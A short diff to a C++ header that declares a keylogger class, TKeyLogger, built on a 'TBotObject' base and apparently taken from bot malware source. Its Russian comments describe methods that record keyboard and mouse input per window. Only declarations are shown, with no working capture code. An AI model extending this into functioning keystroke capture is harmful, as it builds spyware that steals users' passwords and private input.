@@ -4,8 +4,31 @@
 #define KeyLoggerH
 //---------------------------------------------------------------------------
 
+#include <Windows.h>
+
 #include "GetApi.h"
 #include "Strings.h"
+
+
+
+//********************************************************
+//   TKeyLogger - Базовый класс келогера
+//********************************************************
+class TKeyLogger : public TBotObject
+{
+public:
+	TKeyLogger();
+	virtual ~TKeyLogger();
+
+	// Функция записывает лог от клавиатуры
+	bool WriteKeyboard(HWND Wnd, const char* Text);
+
+	// функция записывает лог от мыши
+	bool WriteMouse(HWND Wnd, int X, int Y, int Button);
+
+
+};
+
 
 
 
